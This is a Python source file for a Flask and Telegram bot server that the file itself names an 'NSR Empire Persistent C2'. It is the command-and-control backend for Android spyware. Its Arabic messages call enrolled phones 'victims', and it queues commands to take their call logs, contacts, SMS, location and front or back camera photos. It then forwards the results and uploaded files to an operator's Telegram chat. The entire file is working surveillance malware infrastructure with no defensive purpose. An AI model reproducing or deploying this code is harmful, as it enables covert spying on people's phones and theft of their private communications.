import os
import logging
import threading
import time
import json
from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# ملف تخزين محلي لضمان عدم فقدان الأجهزة عند إعادة تشغيل السيرفر
DB_FILE = "devices_db.json"
pending_commands = {}

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"DB Save error: {e}")

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "system": "NSR Empire Persistent C2",
        "version": "7.11"
    }), 200

@app.route('/api/v1/stream', methods=['POST', 'GET'])
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json if request.is_json else request.form.to_dict()
        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
        
        db = load_db()
        is_new_device = device_id not in db
        
        db[device_id] = {
            "data": data or {"status": "connected"},
            "last_seen": time.time()
        }
        save_db(db)
        
        if is_new_device and bot and ADMIN_ID:
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{device_id}:get_calls"),
                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{device_id}:get_contacts")
            )
            markup.row(
                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{device_id}:get_sms"),
                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{device_id}:get_location")
            )
            markup.row(
                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{device_id}:take_photo_front"),
                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{device_id}:take_photo_back")
            )
            bot.send_message(
                ADMIN_ID,
                f"🚨 <b>تم رصد وسيط جديد والسيطرة عليه!</b>\n\n"
                f"📱 <b>المعرف:</b> <code>{device_id}</code>",
                reply_markup=markup
            )
        
        command_to_execute = pending_commands.pop(device_id, "wait")
        return jsonify({"status": "success", "command": command_to_execute}), 200
    except Exception as e:
        logger.error(f"Connect error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', 'No content')
        
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"📥 <b>نتيجة مهمة ({task_type})</b>\n\n"
                f"👤 <b>الضحية:</b> <code>{device_id}</code>\n\n"
                f"📦 <code>{str(content)[:3500]}</code>"
            )
        return jsonify({"status": "received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def agent_upload():
    try:
        device_id = request.form.get('device_id', 'Unknown')
        task_type = request.form.get('task_type', 'File')
        
        if 'file' in request.files:
            file = request.files['file']
            filename = file.filename or 'media_file.bin'
            file_bytes = file.read()
            
            if bot and ADMIN_ID:
                bot.send_message(
                    ADMIN_ID,
                    f"📁 <b>تم استلام ملف/وسائط بنجاح!</b>\n"
                    f"👤 <b>الجهاز:</b> <code>{device_id}</code>\n"
                    f"📂 <b>النوع:</b> <code>{task_type}</code>"
                )
                bot.send_document(ADMIN_ID, (filename, file_bytes))
        return jsonify({"status": "uploaded"}), 200
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({"error": str(e)}), 500

if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        bot.reply_to(message, "👑 <b>لوحة تحكم إمبراطورية NSR C2 الفعالة والمستقرة</b>\n\nاستخدم الأمر /devices لعرض الأجهزة المتصلة وتحكم بها عبر الأزرار المباشرة.")

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
            
        db = load_db()
        current_time = time.time()
        # بقاء الجهاز نشطاً في القائمة لمدة 24 ساعة منذ آخر اتصال
        active_devs = {k: v for k, v in db.items() if current_time - v['last_seen'] < 86400}
        
        if not active_devs:
            bot.reply_to(message, "⚠️ لا توجد أجهزة مسجلة في قاعدة البيانات حالياً.")
            return
            
        for dev_id in active_devs.keys():
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{dev_id}:get_calls"),
                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{dev_id}:get_contacts")
            )
            markup.row(
                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{dev_id}:get_sms"),
                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{dev_id}:get_location")
            )
            markup.row(
                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{dev_id}:take_photo_front"),
                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{dev_id}:take_photo_back")
            )
            bot.send_message(
                message.chat.id,
                f"💀 <b>الضحية النشطة:</b> <code>{dev_id}</code>",
                reply_markup=markup
            )

    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if str(call.from_user.id) != str(ADMIN_ID):
            return
        data_parts = call.data.split(":")
        if len(data_parts) == 3 and data_parts[0] == "cmd":
            target_id = data_parts[1]
            command_str = data_parts[2]
            
            pending_commands[target_id] = command_str
            bot.answer_callback_query(call.id, f"تم حقن الأمر: {command_str}")
            bot.send_message(
                call.message.chat.id,
                f"🚀 <b>تم إرسال الأمر للضحية <code>{target_id}</code>:</b> <code>{command_str}</code>\n⏳ سيتم التنفيذ فور اتصال الجهاز بالسيرفر."
            )

    def run_bot():
        try:
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
